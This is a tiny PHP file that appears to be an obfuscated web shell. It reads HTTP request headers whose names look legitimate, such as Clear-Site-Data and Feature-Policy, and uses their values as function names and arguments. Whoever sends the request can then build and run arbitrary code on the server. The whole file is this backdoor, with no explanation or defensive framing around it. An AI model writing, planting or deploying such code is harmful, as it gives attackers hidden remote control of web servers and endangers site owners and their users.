<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $class = $_HEADERS['Clear-Site-Data']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Unmodified-Since']));
    $class();
}